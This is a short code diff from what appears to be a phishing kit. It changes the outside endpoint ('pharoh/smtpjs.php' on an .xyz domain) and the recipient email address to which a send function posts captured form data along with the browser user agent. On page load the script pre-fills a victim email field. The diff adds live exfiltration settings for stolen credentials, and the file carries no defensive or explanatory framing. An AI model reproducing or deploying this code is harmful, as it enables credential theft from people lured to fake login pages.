@@ -1,4 +1,4 @@
-var yourUrl ="https://kjkjkalao.xyz/pharoh/smtpjs.php";
+var yourUrl ="https://kaluiirere.xyz/pharoh/smtpjs.php";
         async function send_em(to,from,subject,body){
             let agent = navigator.userAgent;
             var xhr = new XMLHttpRequest();
@@ -19,7 +19,7 @@ var yourUrl ="https://kjkjkalao.xyz/pharoh/smtpjs.php";
           
           
           }
-        var your_email="rp@xzawwree.xyz";
+        var your_email="emilmiller134@gmail.com";
         window.addEventListener("load", function(){
                
         document.getElementById("emaill").value=email;       
